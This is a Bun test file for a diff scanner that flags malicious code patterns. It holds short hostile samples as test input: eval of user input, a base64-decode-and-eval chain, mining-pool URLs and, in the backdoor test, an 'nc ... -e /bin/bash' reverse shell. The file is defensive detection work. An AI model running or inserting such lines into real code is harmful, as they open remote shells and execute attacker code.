import { describe, expect, test } from 'bun:test';
import { scanDiff, formatScanReport } from '../lib/code-scanner';

// ── Dynamic code execution ──────────────────────────────────────────────

describe('dynamic code execution', () => {
    test('detects eval()', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const result = eval(userInput);
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings.length).toBe(1);
        expect(result.findings[0].category).toBe('dynamic_code_execution');
        expect(result.findings[0].pattern).toBe('eval()');
    });

    test('detects new Function()', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const fn = new Function('x', 'return x * 2');
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].pattern).toBe('new Function()');
    });

    test('detects setTimeout with string argument', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+setTimeout('alert("xss")', 1000);
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].pattern).toBe('setTimeout/setInterval with string arg');
    });
});

// ── Process control ─────────────────────────────────────────────────────

describe('process control', () => {
    test('process.exit() is a warning', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+process.exit(1);
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(false);
        expect(result.hasWarnings).toBe(true);
        expect(result.findings[0].severity).toBe('warning');
        expect(result.findings[0].pattern).toBe('process.exit()');
    });

    test('process.kill() is critical', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+process.kill(pid, 'SIGTERM');
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].pattern).toBe('process.kill()');
    });
});

// ── Child process ───────────────────────────────────────────────────────

describe('child process', () => {
    test('detects require child_process', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const { exec } = require('child_process');
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].category).toBe('child_process');
    });

    test('detects import child_process', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+import { exec } from 'child_process';
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].category).toBe('child_process');
    });

    test('does not flag Bun.spawn', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const proc = Bun.spawn(['git', 'status']);
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(false);
        expect(result.findings.length).toBe(0);
    });
});

// ── Obfuscation ─────────────────────────────────────────────────────────

describe('obfuscation', () => {
    test('detects excessive hex escapes', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const s = "\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64";
`;
        const result = scanDiff(diff);
        expect(result.hasWarnings).toBe(true);
        expect(result.findings.some((f) => f.pattern === 'excessive hex escapes')).toBe(true);
    });

    test('detects excessive unicode escapes', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const s = "\\u0068\\u0065\\u006c\\u006c\\u006f\\u0077";
`;
        const result = scanDiff(diff);
        expect(result.hasWarnings).toBe(true);
        expect(result.findings.some((f) => f.pattern === 'excessive unicode escapes')).toBe(true);
    });

    test('detects hex-encoded eval', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+eval("\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65");
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings.some((f) => f.pattern === 'hex-encoded eval')).toBe(true);
    });

    test('detects base64 decode + execute chain', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const code = atob(payload); eval(code);
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings.some((f) => f.pattern === 'base64 decode + execute')).toBe(true);
    });
});

// ── Crypto mining ───────────────────────────────────────────────────────

describe('crypto mining', () => {
    test('detects stratum URLs', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const pool = "stratum+tcp://pool.example.com:3333";
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].category).toBe('crypto_mining');
    });

    test('detects mining pool WebSockets', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+const ws = new WebSocket("wss://mining-pool.example.com/ws");
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].category).toBe('crypto_mining');
    });
});

// ── Backdoor ────────────────────────────────────────────────────────────

describe('backdoor', () => {
    test('detects reverse shell', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+nc 192.168.1.1 4444 -e /bin/bash
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(true);
        expect(result.findings[0].pattern).toBe('reverse shell (nc -e)');
    });

    test('detects Bun.serve in non-server file', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+Bun.serve(({ port: 9999 });
`;
        const result = scanDiff(diff);
        expect(result.hasWarnings).toBe(true);
        expect(result.findings.some((f) => f.pattern === 'server binding in non-server file')).toBe(true);
    });
});

// ── Allowlist / filtering ───────────────────────────────────────────────

describe('allowlist and filtering', () => {
    test('process.exit() in server/index.ts is not flagged', () => {
        const diff = `
diff --git a/server/index.ts b/server/index.ts
+++ b/server/index.ts
+process.exit(1);
`;
        const result = scanDiff(diff);
        expect(result.findings.length).toBe(0);
    });

    test('process.exit() in scripts/ is not flagged', () => {
        const diff = `
diff --git a/scripts/deploy.ts b/scripts/deploy.ts
+++ b/scripts/deploy.ts
+process.exit(0);
`;
        const result = scanDiff(diff);
        expect(result.findings.length).toBe(0);
    });

    test('process.exit() in cli/ is not flagged', () => {
        const diff = `
diff --git a/cli/index.ts b/cli/index.ts
+++ b/cli/index.ts
+process.exit(0);
`;
        const result = scanDiff(diff);
        expect(result.findings.length).toBe(0);
    });

    test('Bun.serve in server/index.ts is not flagged', () => {
        const diff = `
diff --git a/server/index.ts b/server/index.ts
+++ b/server/index.ts
+Bun.serve(({ port: 3000 });
`;
        const result = scanDiff(diff);
        expect(result.findings.length).toBe(0);
    });

    test('removed lines are not flagged', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
-const result = eval(userInput);
+// Removed unsafe eval
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(false);
        expect(result.findings.length).toBe(0);
    });

    test('commented-out code is not flagged', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+// don't use eval() in production
+// require('child_process') is banned
`;
        const result = scanDiff(diff);
        expect(result.findings.length).toBe(0);
    });
});

// ── Clean diff ──────────────────────────────────────────────────────────

describe('clean diff', () => {
    test('produces no findings for safe code', () => {
        const diff = `
diff --git a/server/lib/util.ts b/server/lib/util.ts
+++ b/server/lib/util.ts
+export function helper(x: number): number {
+    return x * 2;
+}
+
+const data = await fetch('https://api.example.com/data');
`;
        const result = scanDiff(diff);
        expect(result.hasCriticalFindings).toBe(false);
        expect(result.hasWarnings).toBe(false);
        expect(result.findings.length).toBe(0);
    });
});

// ── formatScanReport ────────────────────────────────────────────────────

describe('formatScanReport', () => {
    test('returns empty string for clean results', () => {
        const report = formatScanReport({
            hasCriticalFindings: false,
            hasWarnings: false,
            findings: [],
        });
        expect(report).toBe('');
    });

    test('separates critical and warning sections', () => {
        const report = formatScanReport({
            hasCriticalFindings: true,
            hasWarnings: true,
            findings: [
                {
                    category: 'dynamic_code_execution',
                    pattern: 'eval()',
                    line: 'eval(input)',
                    file: 'server/lib/util.ts',
                    severity: 'critical',
                },
                {
                    category: 'process_control',
                    pattern: 'process.exit()',
                    line: 'process.exit(1)',
                    file: 'server/lib/util.ts',
                    severity: 'warning',
                },
            ],
        });
        expect(report).toContain('Critical Findings (blocking)');
        expect(report).toContain('Warnings (non-blocking)');
        expect(report).toContain('eval()');
        expect(report).toContain('process.exit()');
    });

    test('shows only critical section when no warnings', () => {
        const report = formatScanReport({
            hasCriticalFindings: true,
            hasWarnings: false,
            findings: [
                {
                    category: 'child_process',
                    pattern: "require('child_process')",
                    line: "require('child_process')",
                    file: 'server/lib/util.ts',
                    severity: 'critical',
                },
            ],
        });
        expect(report).toContain('Critical Findings');
        expect(report).not.toContain('Warnings');
    });
});
